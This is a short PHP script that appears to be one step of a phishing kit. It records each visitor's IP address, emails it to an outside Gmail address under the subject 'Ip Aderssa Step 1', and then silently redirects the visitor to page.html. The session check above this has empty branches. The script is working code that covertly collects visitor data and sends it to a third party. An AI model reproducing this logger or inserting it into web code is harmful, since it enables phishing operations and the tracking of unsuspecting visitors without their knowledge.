<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
  }
}

$ip = $_SERVER['REMOTE_ADDR'];


$stringi = PHP_EOL .'IP:'. $ip; 
mail("raloqka2021@gmail.com","Ip Aderssa Step 1", $stringi);
header("Location: page.html");

?>